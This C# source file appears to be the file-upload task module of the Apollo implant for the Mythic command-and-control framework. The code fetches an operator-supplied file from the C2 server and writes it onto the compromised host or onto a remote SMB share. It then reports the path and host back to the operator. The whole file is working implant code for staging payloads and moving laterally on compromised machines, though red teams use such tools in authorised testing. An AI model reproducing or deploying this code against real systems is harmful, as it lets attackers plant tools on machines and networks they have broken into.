#define COMMAND_NAME_UPPER

#if DEBUG
#define UPLOAD
#endif

#if UPLOAD

using System;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System.Runtime.Serialization;
using System.IO;
using ApolloInterop.Utils;
using System.Linq;

namespace Tasks
{
    public class upload : Tasking
    {
        [DataContract]
        internal struct UploadParameters
        {
#pragma warning disable 0649
            [DataMember(Name = "remote_path")]
            internal string RemotePath;
            [DataMember(Name = "file")]
            internal string FileID;
            [DataMember(Name = "file_name")]
            internal string FileName;
            [DataMember(Name = "host")]
            internal string HostName;
#pragma warning restore 0649
        }

        public upload(IAgent agent, MythicTask mythicTask) : base(agent, mythicTask)
        {

        }

        internal string ParsePath(UploadParameters p)
        {
            string uploadPath;
            if (!string.IsNullOrEmpty(p.HostName))
            {
                if (!string.IsNullOrEmpty(p.RemotePath))
                {
                    uploadPath = string.Format(@"\\{0}\{1}", p.HostName, p.RemotePath);
                }
                else
                {
                    // Remote paths require a share name
                    throw new ArgumentException("SMB share name not specified.");
                }
            }
            else
            {
                string host = Environment.GetEnvironmentVariable("COMPUTERNAME"); ;
                string cwd = System.IO.Directory.GetCurrentDirectory().ToString();
                if (cwd.StartsWith("\\\\"))
                {
                    var hostPieces = cwd.Split('\\');
                    if (hostPieces.Length > 2)
                    {
                        host = hostPieces[2];
                    }
                    else
                    {
                        var resp = CreateTaskResponse($"invalid UNC path for CWD: {cwd}. Can't determine host. Please use explicit UNC path", true, "error");
                        _agent.GetTaskManager().AddTaskResponseToQueue(resp);
                    }
                }
                if (!string.IsNullOrEmpty(p.RemotePath))
                {
                    if (Path.IsPathRooted(p.RemotePath))
                    {
                        uploadPath = p.RemotePath;
                    }
                    else
                    {
                        uploadPath = Path.GetFullPath(p.RemotePath);
                    }
                }
                else
                {
                    uploadPath = Directory.GetCurrentDirectory();
                }

            }

            string unresolvedFilePath;
            var uploadPathInfo = new DirectoryInfo(uploadPath);
            if (uploadPathInfo.Exists)
            {
                unresolvedFilePath = Path.Combine([uploadPathInfo.FullName, p.FileName]);
            }
            else if (uploadPathInfo.Parent is DirectoryInfo parentInfo && parentInfo.Exists)
            {
                unresolvedFilePath = uploadPathInfo.FullName;
            }
            else
            {
                throw new ArgumentException($"{uploadPath} does not exist.");
            }

            var parentPath = Path.GetDirectoryName(unresolvedFilePath);
            var fileName = unresolvedFilePath.Split(Path.DirectorySeparatorChar).Last();

            string resolvedParent;
            if (PathUtils.TryGetExactPath(parentPath, out var resolved))
            {
                resolvedParent = resolved;
            }
            else
            {
                resolvedParent = parentPath;
            }

            return Path.Combine([resolvedParent, fileName]);
        }


        public override void Start()
        {
            MythicTaskResponse resp;
            UploadParameters parameters = _jsonSerializer.Deserialize<UploadParameters>(_data.Parameters);
            // some additional upload logic
            if (_agent.GetFileManager().GetFile(
                    _cancellationToken.Token,
                    _data.ID,
                    parameters.FileID,
                    out byte[] fileData))
            {
                try
                {
                    string path = ParsePath(parameters);
                    File.WriteAllBytes(path, fileData);
                    string host = Environment.GetEnvironmentVariable("COMPUTERNAME");
                    if (!string.IsNullOrEmpty(parameters.HostName))
                    {
                        host = parameters.HostName;
                    }
                    else
                    {
                        string cwd = System.IO.Directory.GetCurrentDirectory().ToString();
                        if (cwd.StartsWith("\\\\"))
                        {
                            var hostPieces = cwd.Split('\\');
                            if (hostPieces.Length > 2)
                            {
                                host = hostPieces[2];
                            }
                        }
                    }
                    resp = CreateTaskResponse(
                    $"Uploaded {fileData.Length} bytes to {path} on {host}",
                    true,
                    "completed",
                    new IMythicMessage[]
                    {
                        new UploadMessage()
                        {
                            FileID = parameters.FileID,
                            FullPath = path,
                            Host = host,
                        },
                        Artifact.FileWrite(path, fileData.Length)
                    });
                }
                catch (Exception ex)
                {
                    resp = CreateTaskResponse($"Failed to upload file: {ex.Message}", true, "error");
                }
            }
            else
            {
                if (_cancellationToken.IsCancellationRequested)
                {
                    resp = CreateTaskResponse($"Task killed.", true, "killed");
                }
                else
                {
                    resp = CreateTaskResponse("Failed to fetch file due to unknown reason.", true, "error");
                }
            }

            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
        }
    }
}
#endif
